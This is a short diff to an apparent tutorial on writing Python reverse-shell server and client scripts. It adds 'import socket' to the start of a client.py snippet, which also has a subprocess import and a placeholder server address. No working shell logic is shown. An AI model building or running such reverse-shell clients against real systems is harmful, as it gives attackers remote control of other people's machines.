@@ -21,6 +21,7 @@ We will start by creating Python server and client scripts to perform the revers
 Code script reverse shell: file **client.py**
 
 ```python
+import socket
 import subprocess
 
 SERVER_HOST = "xxx.xxx.xx.xx"
